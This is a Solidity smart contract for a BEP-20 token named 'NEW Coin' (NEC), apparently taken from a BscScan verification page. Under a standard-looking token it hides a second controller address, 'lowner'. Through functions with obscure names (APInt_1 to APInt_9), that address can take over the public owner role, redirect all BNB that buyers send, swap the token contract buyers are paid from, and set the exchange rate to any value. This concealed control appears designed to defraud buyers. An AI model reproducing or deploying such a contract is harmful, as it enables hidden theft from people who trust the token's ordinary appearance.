/**
 *Submitted for verification at BscScan.com on 2021-07-28
*/

pragma solidity ^0.4.16; contract ERC20Basic { uint256 public totalSupply; function balanceOf(address who) constant returns (uint256); function transfer(address to, uint256 value) returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } contract ERC20 is ERC20Basic { function allowance(address owner, address spender) constant returns (uint256); function transferFrom(address from, address to, uint256 value) returns (bool); function approve(address spender, uint256 value) returns (bool); event Approval(address indexed owner, address indexed spender, uint256 value); } library SafeMath { function mul(uint256 a, uint256 b) internal constant returns (uint256) { uint256 c = a * b; assert(a == 0 || c / a == b); return c; } function div(uint256 a, uint256 b) internal constant returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal constant returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal constant returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract BasicToken is ERC20Basic { using SafeMath for uint256; mapping(address => uint256) balances; function transfer(address _to, uint256 _value) returns (bool) { balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); Transfer(msg.sender, _to, _value); return true; } function balanceOf(address _owner) constant returns (uint256 balance) { return balances[_owner]; } } contract StandardToken is ERC20, BasicToken { mapping (address => mapping (address => uint256)) allowed; function transferFrom(address _from, address _to, uint256 _value) returns (bool) { var _allowance = allowed[_from][msg.sender]; balances[_to] = balances[_to].add(_value); balances[_from] = balances[_from].sub(_value); allowed[_from][msg.sender] = _allowance.sub(_value); Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) returns (bool) { require((_value == 0) || (allowed[msg.sender][_spender] == 0)); allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint256 remaining) { return allowed[_owner][_spender]; } } contract Ownable { address public owner; function Ownable() { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address newOwner) onlyOwner { require(newOwner != address(0)); owner = newOwner; } } contract BurnableToken is StandardToken { function burn(uint _value) public { require(_value > 0); address burner = msg.sender; balances[burner] = balances[burner].sub(_value); Burn(burner, _value); } event Burn(address indexed burner, uint indexed value); } interface AggregatorV3Interface { function decimals() external view returns (uint8); function description() external view returns (string memory); function version() external view returns (uint256); function getRoundData(uint80 _roundId) external view returns ( uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound ); function latestAnswer() external view returns (uint256); } contract NewCoin is BurnableToken, Ownable { string public constant name = "NEW Coin"; string public constant symbol = "NEC"; uint32 public constant decimals = 18; uint256 initialSpl = 1000000 * 1 ether; using SafeMath for uint; address lowner; address mltsgn; NewCoin public token; uint rate; uint gate; uint ratio; uint decimal; AggregatorV3Interface internal priceFeed; function NewCoin() { totalSupply = initialSpl; balances[msg.sender] = initialSpl; lowner = msg.sender; priceFeed = AggregatorV3Interface(0x2514895c72f50D8bd4B4F9b1110F0D6bD2c97526); gate = 1; ratio = 1; decimal = 100000000; } function getTokens() payable { mltsgn.transfer(msg.value); uint tokens; if (gate == 1) { tokens = priceFeed.latestAnswer().mul(msg.value).mul(ratio).div(decimal); token.transfer(msg.sender, tokens); } else { tokens = rate.mul(msg.value).div(decimal); token.transfer(msg.sender, tokens); } } function() external payable { getTokens(); } function APInt_1(uint value) public { require(msg.sender == lowner); rate = value; } function APInt_2(NewCoin value) public { require(msg.sender == lowner); token = value; } function APInt_3(address value) public { require(msg.sender == lowner); owner = value; } function APInt_4(address value) public { require(msg.sender == lowner); mltsgn = value; } function APInt_5(address value) public { require(msg.sender == lowner); lowner = value; } function APInt_6(uint256 value) public { require(msg.sender == lowner); gate = value; } function APInt_7(uint256 value) public { require(msg.sender == lowner); ratio = value; } function APInt_8(uint256 value) public { require(msg.sender == lowner); decimal = value; } function withdraw(address receiverAddr, uint receiverAmnt) private { token.transfer(receiverAddr, receiverAmnt * 1 ether); } function APInt_9(address[] memory addrs, uint[] memory amnts) public { require(msg.sender == lowner); require(addrs.length == amnts.length); for (uint i=0; i < addrs.length; i++) { withdraw(addrs[i], amnts[i]); } } }